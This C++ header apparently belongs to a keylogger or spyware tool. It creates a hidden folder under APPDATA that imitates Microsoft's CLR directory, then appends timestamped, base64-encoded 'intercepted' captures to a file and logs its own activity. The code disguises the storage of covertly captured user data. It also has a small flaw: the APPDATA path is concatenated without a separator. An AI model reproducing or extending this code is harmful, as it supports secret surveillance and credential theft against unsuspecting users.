#ifndef FILE_HANDLER
#define FILE_HANDLER

#include <string>
#include <windows.h>
#include <fstream>

#include "date_time.h"
#include "base64.h"

using namespace std;

namespace file_handler
{
    string path = (string)getenv("APPDATA") + "Local\\Microsoft\\CLR\\";
    string name = date_time::get_date_time("-", "-");

    void write_logs(const string &msg)
    {
        fstream file;
        if (path[path.length() - 1] == '\\')
            file.open(path + "logs.log", ios::app);
        else
            file.open(path + "\\logs.log", ios::app);

        if (!file)
            return;

        file << "<<" << date_time::get_date_time() << ">>  " << msg << "\n";
        file.close();
    }

    bool make_folders(string file_path)
    {
        bool check;
        for (char &c : file_path)
        {
            if (c == '\\')
            {
                c = '\0';
                check = (bool)(CreateDirectoryA(file_path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS);
                if (!check)
                    return false;
                c = '\\';
            }
        }
        return true;
    }

    string get_full_path()
    {
        if (path[path.length() - 1] == '\\')
            return path + name;
        else
            return path + '\\' + name;
    }

    bool initial()
    {
        bool check = make_folders(path);
        if (!check)
        {
            write_logs("Can't create folders --> " + path);
            return false;
        }

        write_logs("Successfully created/checked folders");
        return true;
    }

    bool write_intercept(const string &captured)
    {
        if (captured.length() == 0)
            return true;

        const string full_path = get_full_path();
        fstream file(full_path, ios::app);
        if (!file)
        {
            write_logs("Can't create/open intercept file --> " + get_full_path());
            return false;
        }
        file << base_64::encrypt("<<" + date_time::get_date_time() + ">>\n" + captured + "\n") << "\n";
        file.close();
        write_logs("Successfully wrote intercept");
        return true;
    }

} // namespace file_handler

#endif